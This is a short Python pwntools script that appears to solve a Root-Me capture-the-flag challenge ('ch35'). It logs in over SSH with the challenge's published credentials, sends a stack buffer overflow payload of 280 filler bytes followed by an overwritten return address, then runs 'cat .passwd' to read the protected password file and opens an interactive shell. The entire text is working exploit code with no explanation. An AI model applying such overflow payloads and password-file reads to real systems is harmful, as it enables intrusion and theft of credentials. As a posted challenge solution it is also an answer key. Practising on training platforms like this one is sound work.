from pwn import*

s = ssh(host='challenge03.root-me.org' ,user='app-systeme-ch35' ,password='app-systeme-ch35',port=2223)
p = s.process('./ch35')

payload = b"a"*280 + p64(0x00000000004005e7)
p.sendline(payload)

p.sendline('cat .passwd')
p.interactive()
